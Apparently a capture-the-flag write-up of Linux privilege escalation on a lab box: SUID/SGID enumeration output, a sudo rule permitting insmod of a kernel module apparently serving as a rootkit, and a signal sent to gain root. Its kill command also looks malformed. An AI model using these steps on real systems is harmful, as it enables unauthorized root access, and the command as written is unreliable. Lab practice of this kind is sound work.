In the folder notes i found the following 

~/notes
- [[mynote.txt]]
- [[msg_from_director.txt]]

Ideas 
- kernel
	Not probable
- SUID/SGID 

```bash
athena@routerpanel:/$ find / -type f -perm /u+s  -user root -exec ls -la {} + 2>/dev/null
-rwsr-xr-x 1 root root             85064 Nov 29  2022 /snap/core20/1891/usr/bin/chfn
-rwsr-xr-x 1 root root             53040 Nov 29  2022 /snap/core20/1891/usr/bin/chsh
-rwsr-xr-x 1 root root             88464 Nov 29  2022 /snap/core20/1891/usr/bin/gpasswd
-rwsr-xr-x 1 root root             55528 Feb  7  2022 /snap/core20/1891/usr/bin/mount
-rwsr-xr-x 1 root root             44784 Nov 29  2022 /snap/core20/1891/usr/bin/newgrp
-rwsr-xr-x 1 root root             68208 Nov 29  2022 /snap/core20/1891/usr/bin/passwd
-rwsr-xr-x 1 root root             67816 Feb  7  2022 /snap/core20/1891/usr/bin/su
-rwsr-xr-x 1 root root            166056 Apr  4  2023 /snap/core20/1891/usr/bin/sudo
-rwsr-xr-x 1 root root             39144 Feb  7  2022 /snap/core20/1891/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve  51344 Oct 25  2022 /snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root            473576 Mar 30  2022 /snap/core20/1891/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root             85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
-rwsr-xr-x 1 root root             53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
-rwsr-xr-x 1 root root             88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
-rwsr-xr-x 1 root root             55528 May 30  2023 /snap/core20/1974/usr/bin/mount
-rwsr-xr-x 1 root root             44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
-rwsr-xr-x 1 root root             68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
-rwsr-xr-x 1 root root             67816 May 30  2023 /snap/core20/1974/usr/bin/su
-rwsr-xr-x 1 root root            166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
-rwsr-xr-x 1 root root             39144 May 30  2023 /snap/core20/1974/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve  51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root            473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root             72712 Nov 24  2022 /snap/core22/634/usr/bin/chfn
-rwsr-xr-x 1 root root             44808 Nov 24  2022 /snap/core22/634/usr/bin/chsh
-rwsr-xr-x 1 root root             72072 Nov 24  2022 /snap/core22/634/usr/bin/gpasswd
-rwsr-xr-x 1 root root             47480 Feb 20  2022 /snap/core22/634/usr/bin/mount
-rwsr-xr-x 1 root root             40496 Nov 24  2022 /snap/core22/634/usr/bin/newgrp
-rwsr-xr-x 1 root root             59976 Nov 24  2022 /snap/core22/634/usr/bin/passwd
-rwsr-xr-x 1 root root             55672 Feb 20  2022 /snap/core22/634/usr/bin/su
-rwsr-xr-x 1 root root            232416 Apr  3  2023 /snap/core22/634/usr/bin/sudo
-rwsr-xr-x 1 root root             35192 Feb 20  2022 /snap/core22/634/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve  35112 Oct 25  2022 /snap/core22/634/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root            338536 Nov 22  2022 /snap/core22/634/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root             72712 Nov 24  2022 /snap/core22/817/usr/bin/chfn
-rwsr-xr-x 1 root root             44808 Nov 24  2022 /snap/core22/817/usr/bin/chsh
-rwsr-xr-x 1 root root             72072 Nov 24  2022 /snap/core22/817/usr/bin/gpasswd
-rwsr-xr-x 1 root root             47480 Feb 20  2022 /snap/core22/817/usr/bin/mount
-rwsr-xr-x 1 root root             40496 Nov 24  2022 /snap/core22/817/usr/bin/newgrp
-rwsr-xr-x 1 root root             59976 Nov 24  2022 /snap/core22/817/usr/bin/passwd
-rwsr-xr-x 1 root root             55672 Feb 20  2022 /snap/core22/817/usr/bin/su
-rwsr-xr-x 1 root root            232416 Apr  3  2023 /snap/core22/817/usr/bin/sudo
-rwsr-xr-x 1 root root             35192 Feb 20  2022 /snap/core22/817/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve  35112 Oct 25  2022 /snap/core22/817/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root            338536 Nov 22  2022 /snap/core22/817/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root            131832 Apr 18  2023 /snap/snapd/19122/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root            131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root             85064 Nov 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root             53040 Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root             88464 Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root             44784 Nov 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root             67816 Feb  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root            166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root             39144 Feb  7  2022 /usr/bin/umount
-rwsr-xr-x 1 root root             14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
```

The only wierd one is dmcrypt-get-device

```bash 
athena@routerpanel:/$ find / -type f -perm /g+s  -user root -exec ls -la {} + 2>/dev/null
-rwxr-sr-x 1 root shadow   84512 Nov 29  2022 /snap/core20/1891/usr/bin/chage
-rwxr-sr-x 1 root shadow   31312 Nov 29  2022 /snap/core20/1891/usr/bin/expiry
-rwxr-sr-x 1 root crontab 350504 Mar 30  2022 /snap/core20/1891/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty      35048 Feb  7  2022 /snap/core20/1891/usr/bin/wall
-rwxr-sr-x 1 root shadow   43168 Feb  2  2023 /snap/core20/1891/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow   43160 Feb  2  2023 /snap/core20/1891/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow   84512 Nov 29  2022 /snap/core20/1974/usr/bin/chage
-rwxr-sr-x 1 root shadow   31312 Nov 29  2022 /snap/core20/1974/usr/bin/expiry
-rwxr-sr-x 1 root crontab 350504 Apr  3  2023 /snap/core20/1974/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty      35048 May 30  2023 /snap/core20/1974/usr/bin/wall
-rwxr-sr-x 1 root shadow   43168 Feb  2  2023 /snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow   43160 Feb  2  2023 /snap/core20/1974/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow   72184 Nov 24  2022 /snap/core22/634/usr/bin/chage
-rwxr-sr-x 1 root shadow   23136 Nov 24  2022 /snap/core22/634/usr/bin/expiry
-rwxr-sr-x 1 root ssh     293304 Nov 22  2022 /snap/core22/634/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty      22904 Feb 20  2022 /snap/core22/634/usr/bin/wall
-rwxr-sr-x 1 root shadow   22680 Feb  2  2023 /snap/core22/634/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow   26776 Feb  2  2023 /snap/core22/634/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow   72184 Nov 24  2022 /snap/core22/817/usr/bin/chage
-rwxr-sr-x 1 root shadow   23136 Nov 24  2022 /snap/core22/817/usr/bin/expiry
-rwxr-sr-x 1 root ssh     293304 Nov 22  2022 /snap/core22/817/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty      22904 Feb 20  2022 /snap/core22/817/usr/bin/wall
-rwxr-sr-x 1 root shadow   22680 Feb  2  2023 /snap/core22/817/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow   26776 Feb  2  2023 /snap/core22/817/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root tty      14488 Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow   84512 Nov 29  2022 /usr/bin/chage
-rwxr-sr-x 1 root crontab  43720 Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow   31312 Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root ssh     350504 Mar 30  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty      35048 Feb  7  2022 /usr/bin/wall
-rwxr-sr-x 1 root mail     22856 Apr  7  2021 /usr/libexec/camel-lock-helper-1.2
-rwxr-sr-x 1 root shadow   43168 Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow   43160 Feb  2  2023 /usr/sbin/unix_chkpwd
```

- SUDO

By trying to get the capabilities of Athena

```bash
athena@routerpanel:/$ sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

This is quite sus

```bash
athena@routerpanel:/$ ls -la /usr/sbin/insmod
lrwxrwxrwx 1 root root 9 Apr 16  2023 /usr/sbin/insmod -> /bin/kmod
athena@routerpanel:/$ ls -la /bin/kmod
-rwxr-xr-x 1 root root 174424 Jan 28  2022 /bin/kmod


athena@routerpanel:/$ ls -la /mnt/.../secret/venom.ko
-rw-r--r-- 1 root root 504616 Apr 17  2023 /mnt/.../secret/venom.ko
```

Idea: change where the softlink points to : not so good idea
Another idea after doing a little research was installing this module. There was a bit of binary analysis which i was really not up to, (looked at the answer for that one), but after that we can 

```bash
kill -k 57 terminal_pid
```

And we elevate ourselves to [[root]]. 

- Notes & athena's directories
- File system misconfigurations
- Cron
- System processes
- CVE's
- Previous services
- Capabilities
- PATH

In case nothing works then get out the linpeas.sh
